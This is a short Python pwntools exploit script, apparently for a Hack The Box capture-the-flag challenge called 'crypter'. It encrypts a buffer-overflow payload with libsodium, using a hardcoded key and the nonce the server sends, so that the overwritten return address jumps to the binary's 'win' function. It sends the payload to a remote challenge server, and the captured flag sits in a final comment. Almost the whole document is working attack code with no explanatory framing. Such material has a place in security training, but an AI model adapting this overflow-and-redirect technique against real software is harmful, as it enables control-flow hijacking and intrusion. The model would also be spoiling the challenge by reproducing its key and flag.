from pwn import *
import ctypes

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./crypter')
#io = process('./crypter')
#io = gdb.debug('./crypter', 'break pwnme')
ip, port = '134.209.182.217',30973
io = remote(ip, port)

io.recvuntil('The nonce is: ')
nonce = io.recvuntil('Length')[:-7]
#print(nonce.encode('hex'))
key = b'th1s_i5_5up312_s3cr3t_1337_keYs'

lib = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libsodium.so.23')
#pt = 'h4x0r'
pt = b'h4x0r'+b'A'*(0x48-5)+p64(elf.sym['win'])
len_pt = len(pt)

ctxt = ctypes.create_string_buffer(0x10 + len_pt)
ret = lib.crypto_secretbox_easy(ctxt, pt, ctypes.c_ulonglong(len_pt), nonce, key)

ct = ctxt.raw
#print(ct.encode('hex'))
len_ct = len(ct) - 0x10
#print(len_ct)

#io.recvuntil('message: ')
io.sendline(str(len_ct))
io.recvuntil('message: ')
io.sendline(ct)

io.interactive()
#HTB{t0O_cryp7ic_2674}
